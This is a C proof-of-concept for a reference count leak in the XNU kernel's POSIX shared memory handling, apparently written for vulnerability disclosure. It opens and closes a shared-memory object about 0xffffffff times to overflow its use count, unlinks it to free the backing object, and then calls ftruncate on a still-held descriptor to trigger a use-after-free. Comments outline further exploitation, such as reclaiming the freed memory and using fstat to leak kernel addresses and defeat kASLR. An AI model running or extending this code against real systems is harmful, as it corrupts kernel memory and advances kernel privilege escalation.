/**
 * Brief: Reference count leak in XNU leads to memory corruption.
 * Repro:
 *    1. clang PosixShmRefLeak.c -o posix_shm_ref_leak
 *    2. ./posix_shm_ref_leak
 */

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {

    const char *shm_name = "/leak.shm";
    /**
     * First, use `shm_open()` to create a shared-memory descriptor.
     * And the `mode`, the last parameter, should be `0666`. First
     * creating object will be cached in kernel.
     *
     * After this operation, the `usecount` should be 2, one for the
     * returned file descriptor, the other for kernel cache.
     *
     * Keep this descriptor open for later use.
     */
    int shm_fd = shm_open(shm_name, O_RDWR | O_CREAT, 0666);
    if (shm_fd < 0) {
        printf("[-] Create shared memory failed: %s\n", strerror(errno));
        return 0;
    }
    printf("[+] Create shared memory descriptor succeed, shm_fd=0x%x, name=%s\n", shm_fd, shm_name);

#define MAX_OPEN_TIMES 0xffffffff

    printf("[*] Now open %s for 0x%x times to ensure overflow of the `usecount`\n", shm_name,
           MAX_OPEN_TIMES);

    for (size_t i = 0; i < MAX_OPEN_TIMES; i++) {
        /**
         * Open again, `shm_open()` in kernel will search `shm_name` from cache
         * and increase the `usecount`.
         */
        int reopen_shm_fd = shm_open(shm_name, O_RDWR);
        if (reopen_shm_fd < 0) {
            printf("[-] Reopen the shared memory of %s failed: %s\n", shm_name, strerror(errno));
            return 0;
        }
        /**
         * Close the file descriptor of reopened shared memory object to trigger
         * `pshm_close()`, but the shared memory is not allocated yet and this operation
         * cannot decrease the `usecount`.
         */
        close(reopen_shm_fd);

        if ((i + 2) % 0x100000 == 0) {
            printf("[*] Now the value of `usecount` is 0x%x\n", (uint32_t)(i + 3));
        }
    }

    /**
     * Trigger unlink to release the backend object of shared memory descriptor since
     * the `usecount` is 1 now.
     */
    shm_unlink(shm_name);

    /**
     * Now the backend memory is freed, but we still hold one reference for that object,
     * do whatever you can on a file descriptor to trigger this issue.
     *
     * Use `ftruncate()` or any other system calls to trigger the use-after-free issue.
     * To exploit this issue, some operations should be done before this step to occupy
     * the freed object memory aforementioned, and once occupied, `fstat()` is an option
     * for leaking memory information which leads to defeating kASLR.
     */
    ftruncate(shm_fd, 0x1000);

    return 0;
}
